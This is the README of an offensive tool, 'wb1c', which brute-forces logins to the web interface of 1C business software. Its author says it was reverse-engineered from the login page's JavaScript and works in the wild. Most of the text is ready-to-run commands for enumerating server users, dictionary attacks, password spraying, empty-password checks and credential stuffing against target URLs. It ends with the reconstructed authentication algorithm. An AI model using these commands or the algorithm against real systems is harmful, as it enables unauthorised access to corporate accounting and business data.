# wb1c
web bruter for 1c

I reversed javascript from 1c login page. Understood how the algorithm works while generating auth-string before sending on the server.

## What in files?
- `1c_bruter.py` — POC written by me, tested and works in the wild
- `1c_bruter.go` — Go version: no dependencies, single binary, TLS 1.0+ support for legacy corporate servers

## Requirements

**Python version:**
```bash
pip install -r requirements.txt
```

**Go version** — no dependencies, just build:
```bash
go build -o wb1c 1c_bruter.go
# Windows:
go build -o wb1c.exe 1c_bruter.go
```

## Help

**Python:**
```
usage: 1c_bruter.py [-h] [-u USER] [-U USERS] [-p PASSWORD] [-P PASSWORDS] [-l] [-o OUTPUT] url

options:
  -u USER       Username to check
  -U USERS      File with usernames list
  -p PASSWORD   Password to try
  -P PASSWORDS  File with passwords list
  -l            Fetch users list from the server
  -o OUTPUT     Save results to file
```

**Go:**
```
Usage: wb1c [-u USER] [-U FILE] [-p PASSWORD] [-P FILE] [-l] [-v] [-o OUTPUT] URL

  -u USER       Username to check
  -U FILE       File with usernames list
  -p PASSWORD   Password to try
  -P FILE       File with passwords list
  -l            Fetch users list from the server
  -v            Verbose: show all attempts including failures
  -o OUTPUT     Save results to file
```

## Usage Examples

### Recon — get users list

```bash
# Python
python 1c_bruter.py -l http://target-server/InfoBase

# Go
./wb1c -l http://target-server/InfoBase
./wb1c -l -o users.txt http://192.168.1.100/accounting
```

### Check specific credentials

```bash
# Python
python 1c_bruter.py -u Administrator -p "Password123" http://target-server/InfoBase

# Go
./wb1c -u Administrator -p "Password123" http://target-server/InfoBase
./wb1c -u Administrator -p "" http://192.168.1.100/production
```

### Dictionary attack

```bash
# Single user, multiple passwords
./wb1c -u Accountant -P passwords.txt http://target-server/InfoBase

# With verbose output and results saved
./wb1c -u Administrator -P common_passwords.txt -v -o results.txt http://192.168.1.100/accounting
```

### Password spraying

```bash
# Single password against user list
./wb1c -U users.txt -p "Spring2024" http://target-server/InfoBase

# Check empty passwords for all users
./wb1c -U users.txt -p "" -o empty_passwords.txt http://192.168.1.100/production
```

### Credential stuffing

```bash
# User list + password list
./wb1c -U users.txt -P passwords.txt http://target-server/InfoBase

# With verbose output
./wb1c -U discovered_users.txt -P top1000.txt -v -o compromised.txt http://192.168.1.100/accounting
```

### Fetch users + bruteforce in one command (Go only)

```bash
./wb1c -l -P passwords.txt http://target-server/InfoBase
```

## Algorithm
- key1 = `AES256-CBC(data=rand(32 bytes), key=sha256(base64(sha1(password)))`
- key2 = `AES256-CBC(data=rand(32 bytes), key=sha256(base64(sha1(upper(password))))`
- data1 = `bytes(login)`
- payload = `[1, len(key1), key1, len(key2), key2, packed_little-endian(len(data1)), data1]`
- checksum = `crc32(payload)`
- result = `base64(payload + packed_little-endian(checksum))`
